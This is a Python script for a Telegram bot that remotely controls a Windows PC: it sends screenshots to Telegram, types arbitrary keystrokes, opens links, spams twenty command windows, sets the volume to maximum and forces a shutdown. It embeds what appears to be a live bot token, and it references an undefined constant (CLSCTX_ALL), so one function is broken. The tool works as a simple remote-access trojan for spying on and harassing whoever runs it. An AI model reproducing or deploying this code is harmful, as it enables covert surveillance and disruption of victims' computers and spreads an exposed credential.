import os
import telebot
from telebot import types
import pyautogui
import subprocess
import psutil
import webbrowser
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import cast, POINTER

TOKEN = '8039669622:AAHjN4DHB7bWlwsBKbbMsvDOyxrbNPOk4QA'
ALLOWED_ID = 8194220203

bot = telebot.TeleBot(TOKEN)

def is_authorized(message):
    return message.from_user.id == ALLOWED_ID

@bot.message_handler(commands=['start'])
def start(message):
    if not is_authorized(message):
        bot.send_message(message.chat.id, "‚ùå –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç", callback_data='screenshot'),
        types.InlineKeyboardButton("üìã –ë–ª–æ–∫–Ω–æ—Ç", callback_data='notepad'),
        types.InlineKeyboardButton("‚ùå –ó–∞–∫—Ä—ã—Ç—å –æ–∫–Ω–æ", callback_data='close_window'),
        types.InlineKeyboardButton("üñ± –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –º—ã—à–∫–æ–π", callback_data='mouse_move'),
        types.InlineKeyboardButton("üí£ CMD –°–ø–∞–º", callback_data='cmd_spam'),
        types.InlineKeyboardButton("üîå –í—ã–∫–ª—é—á–∏—Ç—å", callback_data='shutdown'),
        types.InlineKeyboardButton("üß† –°–∏—Å—Ç–µ–º–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è", callback_data='sysinfo'),
        types.InlineKeyboardButton("üåê –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É", callback_data='open_link'),
        types.InlineKeyboardButton("üñä –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–æ–π", callback_data='keyboard_control'),
        types.InlineKeyboardButton("üîä –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –∑–≤—É–∫ –Ω–∞ 100%", callback_data='set_volume')
    )

    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.from_user.id != ALLOWED_ID:
        bot.answer_callback_query(call.id, "‚ùå –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞")
        return

    if call.data == 'screenshot':
        try:
            # –ò–∑–º–µ–Ω–µ–Ω–∏–µ –ø—É—Ç–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ –Ω–∞ —Ä–∞–±–æ—á–∏–π —Å—Ç–æ–ª
            screenshot = pyautogui.screenshot()
            desktop_path = os.path.expanduser("~/Desktop/screen.png")
            screenshot.save(desktop_path)
            with open(desktop_path, 'rb') as f:
                bot.send_photo(call.message.chat.id, f)
            bot.send_message(call.message.chat.id, "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç —Å–¥–µ–ª–∞–Ω –∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω.")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {e}")

    elif call.data == 'notepad':
        subprocess.Popen(["notepad.exe"])
        bot.send_message(call.message.chat.id, "üìã Notepad –æ—Ç–∫—Ä—ã—Ç.")

    elif call.data == 'close_window':
        try:
            window = pyautogui.getActiveWindow()
            if window:
                window.close()
                bot.send_message(call.message.chat.id, "‚ùå –ê–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ –∑–∞–∫—Ä—ã—Ç–æ.")
            else:
                bot.send_message(call.message.chat.id, "‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –Ω–∞–π—Ç–∏ –æ–∫–Ω–æ.")
        except Exception as e:
            bot.send_message(call.message.chat.id, f"–û—à–∏–±–∫–∞: {e}")

    elif call.data == 'cmd_spam':
        for _ in range(20):
            subprocess.Popen("start cmd", shell=True)
        bot.send_message(call.message.chat.id, "üí£ –ó–∞–ø—É—â–µ–Ω–æ 20 –æ–∫–æ–Ω CMD.")

    elif call.data == 'shutdown':
        os.system("shutdown /s /t 10")
        bot.send_message(call.message.chat.id, "üîå –ü–ö –±—É–¥–µ—Ç –≤—ã–∫–ª—é—á–µ–Ω —á–µ—Ä–µ–∑ 10 —Å–µ–∫—É–Ω–¥.")

    elif call.data == 'mouse_move':
        pyautogui.moveTo(100, 100, duration=1)
        bot.send_message(call.message.chat.id, "üñ± –ú—ã—à–∫–∞ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∞.")

    elif call.data == 'sysinfo':
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        msg = f"üß† CPU: {cpu}%\nüíæ RAM: {ram}%"
        bot.send_message(call.message.chat.id, msg)

    elif call.data == 'open_link':
        msg = bot.send_message(call.message.chat.id, "–í–≤–µ–¥–∏—Ç–µ URL —Å—Å—ã–ª–∫–∏:")
        bot.register_next_step_handler(msg, handle_link)

    elif call.data == 'keyboard_control':
        msg = bot.send_message(call.message.chat.id, "–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç –¥–ª—è –≤–≤–æ–¥–∞:")
        bot.register_next_step_handler(msg, handle_keyboard_input)

    elif call.data == 'set_volume':
        set_volume_to_max(call.message.chat.id)

def handle_keyboard_input(message):
    text = message.text
    try:
        pyautogui.typewrite(text)
        bot.send_message(message.chat.id, "üñä –¢–µ–∫—Å—Ç –≤–≤–µ–¥–µ–Ω.")
    except Exception as e:
        bot.send_message(message.chat.id, f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤–≤–æ–¥–µ —Ç–µ–∫—Å—Ç–∞: {e}")

def handle_link(message):
    link = message.text
    webbrowser.open(link)
    bot.send_message(message.chat.id, f"üåê –û—Ç–∫—Ä—ã–≤–∞—é —Å—Å—ã–ª–∫—É: {link}")

def set_volume_to_max(chat_id):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(1.0, None)  # –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –≥—Ä–æ–º–∫–æ—Å—Ç–∏ –Ω–∞ 100%
    bot.send_message(chat_id, "üîä –ì—Ä–æ–º–∫–æ—Å—Ç—å –±—ã–ª–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ 100%.")

bot.polling()

